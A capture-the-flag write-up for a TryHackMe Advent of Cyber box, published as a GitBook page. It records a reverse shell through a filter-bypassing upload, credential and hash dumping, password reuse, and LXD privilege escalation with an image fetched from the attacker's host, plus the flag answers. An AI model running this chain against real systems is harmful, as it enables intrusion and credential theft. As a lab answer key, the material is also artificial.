@@ -1,0 +1,1246 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Day 24 - The Trial Before Christmas · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../WebFundamentals.html" />
+    
+    
+    <link rel="prev" href="Day23-TheGrinchstrikesagain.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">TryHackMe</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    TryHackMe Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Advent of Cyber 2
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="Day01-ChristmasCrisis.html">
+            
+                <a href="Day01-ChristmasCrisis.html">
+            
+                    
+                    Day 01 - Christmas Crisis
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="Day02-TheElfStrikesBack.html">
+            
+                <a href="Day02-TheElfStrikesBack.html">
+            
+                    
+                    Day 02 - The Elf Strikes Back!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="Day03-ChristmasChaos.html">
+            
+                <a href="Day03-ChristmasChaos.html">
+            
+                    
+                    Day 03 - Christmas Chaos
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="Day04-Santa'sWatching.html">
+            
+                <a href="Day04-Santa'sWatching.html">
+            
+                    
+                    Day 04 - Santa's Watching
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.5" data-path="Day05-SomeonestoleSanta'sgiftlist.html">
+            
+                <a href="Day05-SomeonestoleSanta'sgiftlist.html">
+            
+                    
+                    Day 05 - Someone stole Santa's gift list!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.6" data-path="Day06-XSS.html">
+            
+                <a href="Day06-XSS.html">
+            
+                    
+                    Day 06 - Be careful with what you wish on a Christmas night
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.7" data-path="Day07-Wireshark.html">
+            
+                <a href="Day07-Wireshark.html">
+            
+                    
+                    Day 07 - The Grinch Really Did Steal Christmas
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.8" data-path="Day08-Nmap.html">
+            
+                <a href="Day08-Nmap.html">
+            
+                    
+                    Day 08 - What's Under the Christmas Tree?
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.9" data-path="Day09-AnyonecanbeSanta.html">
+            
+                <a href="Day09-AnyonecanbeSanta.html">
+            
+                    
+                    Day 09 - Anyone can be Santa!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.10" data-path="Day10-Don'tbesElfish.html">
+            
+                <a href="Day10-Don'tbesElfish.html">
+            
+                    
+                    Day 10 - Don't be sElfish!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.11" data-path="Day11-TheRogueGnome.html">
+            
+                <a href="Day11-TheRogueGnome.html">
+            
+                    
+                    Day 11 - The Rogue Gnome
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.12" data-path="Day12-Ready,set,elf.html">
+            
+                <a href="Day12-Ready,set,elf.html">
+            
+                    
+                    Day 12 - Ready, set, elf
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.13" data-path="Day13-CoalforChristmas.html">
+            
+                <a href="Day13-CoalforChristmas.html">
+            
+                    
+                    Day 13 - Coal for Christmas
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.14" data-path="Day14-Where'sRudolph.html">
+            
+                <a href="Day14-Where'sRudolph.html">
+            
+                    
+                    Day 14 - Where's Rudolph?
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.15" data-path="Day15-There'saPythoninmystocking.html">
+            
+                <a href="Day15-There'saPythoninmystocking.html">
+            
+                    
+                    Day 15 - There's a Python in my stocking!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.16" data-path="Day16-Help!WhereisSanta.html">
+            
+                <a href="Day16-Help!WhereisSanta.html">
+            
+                    
+                    Day 16 - Help! Where is Santa?
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.17" data-path="Day17-ReverseELFneering.html">
+            
+                <a href="Day17-ReverseELFneering.html">
+            
+                    
+                    Day 17 - ReverseELFneering
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.18" data-path="Day18-TheBitsofChristmas.html">
+            
+                <a href="Day18-TheBitsofChristmas.html">
+            
+                    
+                    Day 18 - The Bits of Christmas
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.19" data-path="Day19-TheNaughtyorNiceList.html">
+            
+                <a href="Day19-TheNaughtyorNiceList.html">
+            
+                    
+                    Day 19 - The Naughty or Nice List
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.20" data-path="Day20-PowershELlFtotherescue.html">
+            
+                <a href="Day20-PowershELlFtotherescue.html">
+            
+                    
+                    Day 20 - PowershELlF to the rescue
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.21" data-path="Day21-TimeforsomeELForensics.html">
+            
+                <a href="Day21-TimeforsomeELForensics.html">
+            
+                    
+                    Day 21 - Time for some ELForensics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.22" data-path="Day22-ElfMcEagerbecomesCyberElf.html">
+            
+                <a href="Day22-ElfMcEagerbecomesCyberElf.html">
+            
+                    
+                    Day 22 - Elf McEager becomes CyberElf
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.23" data-path="Day23-TheGrinchstrikesagain.html">
+            
+                <a href="Day23-TheGrinchstrikesagain.html">
+            
+                    
+                    Day 23 - The Grinch strikes again!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.2.24" data-path="Day24-TheTrialBeforeChristmas.html">
+            
+                <a href="Day24-TheTrialBeforeChristmas.html">
+            
+                    
+                    Day 24 - The Trial Before Christmas
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../WebFundamentals.html">
+            
+                <a href="../WebFundamentals.html">
+            
+                    
+                    Web Fundamentals
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../Anonymous.html">
+            
+                <a href="../Anonymous.html">
+            
+                    
+                    Anonymous
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="../PrinterHacking101.html">
+            
+                <a href="../PrinterHacking101.html">
+            
+                    
+                    Printer Hacking 101
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6" data-path="../OWASPTop10/">
+            
+                <a href="../OWASPTop10/">
+            
+                    
+                    OWASP Top 10
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.6.1" data-path="../OWASPTop10/Injection.html">
+            
+                <a href="../OWASPTop10/Injection.html">
+            
+                    
+                    Injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.2" data-path="../OWASPTop10/BrokenAuthentication.html">
+            
+                <a href="../OWASPTop10/BrokenAuthentication.html">
+            
+                    
+                    Broken Authentication
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.3" data-path="../OWASPTop10/SensitiveDataExposure.html">
+            
+                <a href="../OWASPTop10/SensitiveDataExposure.html">
+            
+                    
+                    Sensitive Data Exposure
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.4" data-path="../OWASPTop10/XMLExternalEntity.html">
+            
+                <a href="../OWASPTop10/XMLExternalEntity.html">
+            
+                    
+                    XML External Entity
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.5" data-path="../OWASPTop10/BrokenAccessControl.html">
+            
+                <a href="../OWASPTop10/BrokenAccessControl.html">
+            
+                    
+                    Broken Access Control
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.6" data-path="../OWASPTop10/SecurityMisconfiguration.html">
+            
+                <a href="../OWASPTop10/SecurityMisconfiguration.html">
+            
+                    
+                    Security Misconfiguration
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.7" data-path="../OWASPTop10/Cross-SiteScripting.html">
+            
+                <a href="../OWASPTop10/Cross-SiteScripting.html">
+            
+                    
+                    Cross-Site Scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.8" data-path="../OWASPTop10/InsecureDeserialization.html">
+            
+                <a href="../OWASPTop10/InsecureDeserialization.html">
+            
+                    
+                    Insecure Deserialization
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.9" data-path="../OWASPTop10/ComponentsWithKnownVulnerabilities.html">
+            
+                <a href="../OWASPTop10/ComponentsWithKnownVulnerabilities.html">
+            
+                    
+                    Components with Known Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6.10" data-path="../OWASPTop10/InsufficentLoggingMonitoring.html">
+            
+                <a href="../OWASPTop10/InsufficentLoggingMonitoring.html">
+            
+                    
+                    Insufficent Logging & Monitoring
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7" data-path="../Vulnversity.html">
+            
+                <a href="../Vulnversity.html">
+            
+                    
+                    Vulnversity
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8" data-path="../Nmap.html">
+            
+                <a href="../Nmap.html">
+            
+                    
+                    Nmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9" data-path="../GoogleDorking.html">
+            
+                <a href="../GoogleDorking.html">
+            
+                    
+                    Google Dorking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.10" data-path="../Blog.html">
+            
+                <a href="../Blog.html">
+            
+                    
+                    Blog
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">HackTheBox</li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" data-path="../../HackTheBox/">
+            
+                <a href="../../HackTheBox/">
+            
+                    
+                    HackTheBox Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.2" data-path="../../HackTheBox/Emdeefiveforlife.html">
+            
+                <a href="../../HackTheBox/Emdeefiveforlife.html">
+            
+                    
+                    Emdee five for life
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">VulnCon2020</li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" data-path="../../VulnCon2020/">
+            
+                <a href="../../VulnCon2020/">
+            
+                    
+                    VulnCon2020 Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" data-path="../../VulnCon2020/NoobBotWelcomesYou.html">
+            
+                <a href="../../VulnCon2020/NoobBotWelcomesYou.html">
+            
+                    
+                    Noob Bot Welcomes You!
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.3" data-path="../../VulnCon2020/Maze.html">
+            
+                <a href="../../VulnCon2020/Maze.html">
+            
+                    
+                    Maze
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.4" data-path="../../VulnCon2020/Pcaped.html">
+            
+                <a href="../../VulnCon2020/Pcaped.html">
+            
+                    
+                    Pcaped
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Day 24 - The Trial Before Christmas</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="day-24---the-trial-before-christmas">Day 24 - The Trial Before Christmas</h1>
+<p><strong>Date:</strong> 24, December, 2020</p>
+<p><strong>Author:</strong> Dhilip Sanjay S</p>
+<hr>
+<ul>
+<li>Bypassing client side filters using BurpSuite</li>
+<li><p>Shell Upgrading and Stabilization</p>
+<ul>
+<li><code>python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</code></li>
+<li><code>export TERM=xterm</code> - this will give access to commands like <code>clear</code>.</li>
+<li>Finally press <code>Ctrl + Z</code> and then type <code>stty raw -echo; fg</code>.</li>
+</ul>
+</li>
+<li><p>MYSql:</p>
+<ul>
+<li><code>mysql -uUSERNAME -p</code></li>
+</ul>
+</li>
+<li><p>Online password cracking:</p>
+<ul>
+<li><a href="https://crackstation.net/" target="_blank">CrackStation</a></li>
+<li><a href="https://md5decrypt.net/en/" target="_blank">MD5 Decrypt</a></li>
+<li><a href="https://hashes.com/en/decrypt/hash" target="_blank">Hashes</a></li>
+</ul>
+</li>
+<li><p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/" target="_blank">Privilege Escalation with LXD</a></p>
+</li>
+</ul>
+<hr>
+<h2 id="solutions">Solutions</h2>
+<h3 id="scan-the-machine-what-ports-are-open">Scan the machine. What ports are open?</h3>
+<ul>
+<li><strong>Answer:</strong> 80, 65000</li>
+<li><p><strong>Steps to Reproduce:</strong> </p>
+<pre><code class="lang-bash">  root@kali: nmap &lt;MACHINE_IP&gt;
+  Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-25 15:42 IST
+  Nmap scan report <span class="hljs-keyword">for</span> &lt;MACHINE_IP&gt;
+  Host is up (0.17s latency).
+  Not shown: 998 closed ports
+  PORT      STATE SERVICE
+  80/tcp    open  http
+  65000/tcp open  unknown
+
+  Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.52 seconds
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="whats-the-title-of-the-hidden-website-its-worthwhile-looking-recursively-at-all-websites-on-the-box-for-this-step">What&apos;s the title of the hidden website? It&apos;s worthwhile looking recursively at all websites on the box for this step.</h3>
+<ul>
+<li><strong>Answer:</strong> Light Cycle</li>
+<li><strong>Steps to Reproduce:</strong> Visit <code>http://&lt;MACHINE_IP&gt;:65000/</code></li>
+</ul>
+<hr>
+<h3 id="what-is-the-name-of-the-hidden-php-page">What is the name of the hidden php page?</h3>
+<ul>
+<li><strong>Answer:</strong> uploads.php</li>
+<li><strong>Steps to Reproduce:</strong> <pre><code class="lang-bash">  root@kali: gobuster dir -u http://&lt;MACHINE_IP&gt;:65000 -t 100 -w /usr/share/wordlists/dirb/common.txt -x .php | tee gobuster.txt
+  ===============================================================
+  Gobuster v3.0.1
+  by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+  ===============================================================
+  [+] Url:            http://&lt;MACHINE_IP&gt;:65000
+  [+] Threads:        100
+  [+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+  [+] Status codes:   200,204,301,302,307,401,403                                                                                                                                             
+  [+] User Agent:     gobuster/3.0.1                                                                                                                                                          
+  [+] Extensions: php                                                                                                                                                                     
+  [+] Timeout:        10s                                                                                                                                                                     
+  ===============================================================
+  2020/12/25 15:56:42 Starting gobuster
+  ===============================================================
+  /.htaccess (Status: 403)
+  /.htaccess.php (Status: 403)
+  /.htpasswd (Status: 403)
+  /.htpasswd.php (Status: 403)
+  /.hta (Status: 403)
+  /.hta.php (Status: 403)
+  /api (Status: 301)
+  /assets (Status: 301)
+  /grid (Status: 301)
+  /index.php (Status: 200)
+  /index.php (Status: 200)
+  /server-status (Status: 403)
+  /uploads.php (Status: 200)
+  ===============================================================
+  2020/12/25 15:57:07 Finished
+  ===============================================================
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="what-is-the-name-of-the-hidden-directory-where-file-uploads-are-saved">What is the name of the hidden directory where file uploads are saved?</h3>
+<ul>
+<li><strong>Answer:</strong> grid</li>
+<li><strong>Steps to Reproduce:</strong> Gobuster output.</li>
+</ul>
+<hr>
+<h3 id="bypass-the-filters-upload-and-execute-a-reverse-shell">Bypass the filters. Upload and execute a reverse shell.</h3>
+<ul>
+<li><strong>Steps to Reproduce:</strong> <ul>
+<li>Upload <code>reverseShell.png.php</code> with any code for reverse shell.</li>
+<li>Listen using netcat: <code>sudo nc -lvnp $port</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="what-is-the-value-of-the-webtxt-flag">What is the value of the web.txt flag?</h3>
+<ul>
+<li><strong>Answer:</strong> THM{ENTER_THE_GRID}</li>
+<li><strong>Steps to Reproduce:</strong> <pre><code class="lang-bash">  www-data@light-cycle:/$ find . -type f -name web.txt 2&gt;/dev/null
+  ./var/www/web.txt
+  www-data@light-cycle:/$ cat /var/www/web.txt
+  THM{ENTER_THE_GRID}
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="upgrade-and-stabilize-your-shell">Upgrade and stabilize your shell</h3>
+<ul>
+<li><strong>Steps to Reproduce:</strong> <pre><code class="lang-bash">  $ python3 -c <span class="hljs-string">&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span>
+  www-data@light-cycle:/$ <span class="hljs-built_in">export</span> TERM=xterm
+  <span class="hljs-built_in">export</span> TERM=xterm
+  www-data@light-cycle:/$ ^Z
+  [1]+  Stopped                 nc -lvnp 1234
+  root@kali: stty raw -echo; <span class="hljs-built_in">fg</span>
+  nc -lvnp 1234
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="review-the-configuration-files-for-the-webserver-to-find-some-useful-loot-in-the-form-of-credentials-what-credentials-do-you-find-usernamepassword">Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password</h3>
+<ul>
+<li><strong>Answer:</strong> tron:IFightForTheUsers</li>
+<li><p><strong>Steps to Reproduce:</strong> </p>
+<pre><code class="lang-bash">  www-data@light-cycle:/$ <span class="hljs-built_in">cd</span> /var/www/
+  www-data@light-cycle:/var/www$ ls
+  ENCOM  TheGrid  web.txt
+  www-data@light-cycle:/var/www$ <span class="hljs-built_in">cd</span> TheGrid/
+  www-data@light-cycle:/var/www/TheGrid$ ls
+  includes  public_html  rickroll.mp4
+  www-data@light-cycle:/var/www/TheGrid$ ls -la
+  total 15576
+  drwxr-xr-x 4 root root     4096 Dec 16 22:34 .
+  drwxr-xr-x 4 root root     4096 Dec 20 03:43 ..
+  drwxr-xr-x 2 root root     4096 Dec 20 03:20 includes
+  drwxr-xr-x 5 root root     4096 Dec 20 03:20 public_html
+  -rw-r--r-- 1 root root 15929856 Dec 16 17:58 rickroll.mp4
+  www-data@light-cycle:/var/www/TheGrid$ <span class="hljs-built_in">cd</span> includes/
+  www-data@light-cycle:/var/www/TheGrid/includes$ ls
+  apiIncludes.php  dbauth.php  login.php  register.php  upload.php
+  www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php 
+  &lt;?php
+          <span class="hljs-variable">$dbaddr</span> = <span class="hljs-string">&quot;localhost&quot;</span>;
+          <span class="hljs-variable">$dbuser</span> = <span class="hljs-string">&quot;tron&quot;</span>;
+          <span class="hljs-variable">$dbpass</span> = <span class="hljs-string">&quot;IFightForTheUsers&quot;</span>;
+          <span class="hljs-variable">$database</span> = <span class="hljs-string">&quot;tron&quot;</span>;
+
+          <span class="hljs-variable">$dbh</span> = new mysqli(<span class="hljs-variable">$dbaddr</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$database</span>);
+          <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dbh</span>-&gt;connect_error){
+                  die(<span class="hljs-variable">$dbh</span>-&gt;connect_error);
+          }
+  ?&gt;
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="access-the-database-and-discover-the-encrypted-credentials-what-is-the-name-of-the-database-you-find-these-in">Access the database and discover the encrypted credentials. What is the name of the database you find these in?</h3>
+<ul>
+<li><strong>Answer:</strong> tron</li>
+<li><p><strong>Steps to Reproduce:</strong> </p>
+<pre><code class="lang-bash">  www-data@light-cycle:/var/www/TheGrid/includes$ mysql -utron -p
+  Enter password: 
+  Welcome to the MySQL monitor.  Commands end with ; or \g.
+  Your MySQL connection id is 7
+  Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)
+
+  Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+  Oracle is a registered trademark of Oracle Corporation and/or its
+  affiliates. Other names may be trademarks of their respective
+  owners.
+
+  Type <span class="hljs-string">&apos;help;&apos;</span> or <span class="hljs-string">&apos;\h&apos;</span> <span class="hljs-keyword">for</span> help. Type <span class="hljs-string">&apos;\c&apos;</span> to clear the current input statement.
+
+  mysql&gt; show databases;
+  +--------------------+
+  | Database           |
+  +--------------------+
+  | information_schema |
+  | tron               |
+  +--------------------+
+  2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.02 sec)
+
+  mysql&gt; use tron
+  Reading table information <span class="hljs-keyword">for</span> completion of table and column names
+  You can turn off this feature to get a quicker startup with -A
+
+  Database changed
+  mysql&gt; show tables;
+  +----------------+
+  | Tables_<span class="hljs-keyword">in</span>_tron |
+  +----------------+
+  | users          |
+  +----------------+
+  1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)
+
+  mysql&gt; select * from users;
+  +----+----------+----------------------------------+
+  | id | username | password                         |
+  +----+----------+----------------------------------+
+  |  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |
+  +----+----------+----------------------------------+
+  1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="crack-the-password-what-is-it">Crack the password. What is it?</h3>
+<ul>
+<li><strong>Answer:</strong> @computer@</li>
+<li><strong>Steps to Reproduce:</strong> <ul>
+<li>Use <a href="https://hashes.com/en/decrypt/hash" target="_blank">Hashes decrypt</a></li>
+<li><code>edc621628f6d19a13a00fd683f5e3ff7:@computer@</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="use-su-to-login-to-the-newly-discovered-user-by-exploiting-password-reuse">Use su to login to the newly discovered user by exploiting password reuse.</h3>
+<ul>
+<li><strong>Steps to Reproduce:</strong> <pre><code class="lang-bash">  www-data@light-cycle:/var/www/TheGrid/includes$ id       
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  www-data@light-cycle:/var/www/TheGrid/includes$ su flynn
+  Password: 
+  flynn@light-cycle:/var/www/TheGrid/includes$ id
+  uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="what-is-the-value-of-the-usertxt-flag">What is the value of the user.txt flag?</h3>
+<ul>
+<li><strong>Answer:</strong> THM{IDENTITY_DISC_RECOGNISED}</li>
+<li><strong>Steps to Reproduce:</strong> <pre><code class="lang-bash">  flynn@light-cycle:~$ ls
+  user.txt
+  flynn@light-cycle:~$ cat user.txt 
+  THM{IDENTITY_DISC_RECOGNISED}
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="check-the-users-groups-which-group-can-be-leveraged-to-escalate-privileges">Check the user&apos;s groups. Which group can be leveraged to escalate privileges?</h3>
+<ul>
+<li><strong>Answer:</strong> lxd</li>
+<li><strong>Steps to Reproduce:</strong> <pre><code class="lang-bash">  flynn@light-cycle:/var/www/TheGrid/includes$ id
+  uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)
+</code></pre>
+</li>
+</ul>
+<hr>
+<h3 id="abuse-this-group-to-escalate-privileges-to-root">Abuse this group to escalate privileges to root.</h3>
+<ul>
+<li><p><strong>Steps to Reproduce:</strong> </p>
+<ul>
+<li><p>In your attack machine:</p>
+<pre><code class="lang-bash">root@kali: git <span class="hljs-built_in">clone</span> https://github.com/lxd-images/alpine-3-7-apache-php5-6
+Cloning into <span class="hljs-string">&apos;alpine-3-7-apache-php5-6&apos;</span>...
+remote: Enumerating objects: 9, done.
+remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 9
+Receiving objects: 100% (9/9), 12.41 MiB | 7.13 MiB/s, done.
+Resolving deltas: 100% (1/1), done.
+root@kali: <span class="hljs-built_in">cd</span> alpine-3-7-apache-php5-6/
+root@kali:~/alpine-3-7-apache-php5-6<span class="hljs-comment"># ls</span>
+alpine-3-7-apache-php5-6.tar.bz2.000  image.yaml  import.sh  README.md
+root@kali:~/alpine-3-7-apache-php5-6<span class="hljs-comment"># python -m SimpleHTTPServer</span>
+Serving HTTP on 0.0.0.0 port 8000 ...
+</code></pre>
+</li>
+<li><p>In the victim machine:</p>
+<pre><code class="lang-bash">flynn@light-cycle:/$ <span class="hljs-built_in">cd</span> tmp/
+flynn@light-cycle:/tmp$ wget &lt;YOUR_IP&gt;:8000/alpine-3-7-apache-php5-6.tar.bz2.000
+--2020-12-25 12:59:22--  http://&lt;YOUR_IP&gt;:8000/alpine-3-7-apache-php5-6.tar.bz2.000
+Connecting to &lt;YOUR_IP&gt;:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 13019149 (12M) [application/octet-stream]
+Saving to: &#x2018;alpine-3-7-apache-php5-6.tar.bz2.000&#x2019;
+
+alpine-3-7-apache-p 100%[===================&gt;]  12.42M  3.28MB/s    <span class="hljs-keyword">in</span> 7.3s    
+
+2020-12-25 12:59:30 (1.69 MB/s) - &#x2018;alpine-3-7-apache-php5-6.tar.bz2.000&#x2019; saved [13019149/13019149]
+flynn@light-cycle:/tmp$ lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias dsimage
+flynn@light-cycle:/tmp$ lxc image list
++---------+--------------+--------+-------------------------------+--------+---------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE   |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+---------+------------------------------+
+| Alpine  | a569b9af4e85 | no     | alpine v3.12 (20201220_03:48) | x86_64 | 3.07MB  | Dec 20, 2020 at 3:51am (UTC) |
++---------+--------------+--------+-------------------------------+--------+---------+------------------------------+
+| dsimage | 4d565cdcbaad | no     | Alpine-LAMP                   | x86_64 | 12.42MB | Dec 25, 2020 at 1:01pm (UTC) |
++---------+--------------+--------+-------------------------------+--------+---------+------------------------------+
+
+flynn@light-cycle:/tmp$ lxc init dsimage dscontainer -c security.privileged=<span class="hljs-literal">true</span>
+Creating dscontainer
+flynn@light-cycle:/tmp$ lxc config device add dscontainer dsdevice disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span>
+Device dsdevice added to dscontainer
+flynn@light-cycle:/tmp$ lxc start dscontainer
+flynn@light-cycle:/tmp$ lxc <span class="hljs-built_in">exec</span> dscontainer /bin/sh
+~ <span class="hljs-comment"># whoami</span>
+root
+~ <span class="hljs-comment"># id</span>
+uid=0(root) gid=0(root)
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="what-is-the-value-of-the-roottxt-flag">What is the value of the root.txt flag?</h3>
+<ul>
+<li><strong>Answer:</strong> THM{FLYNN_LIVES}</li>
+<li><strong>Steps to Reproduce:</strong></li>
+</ul>
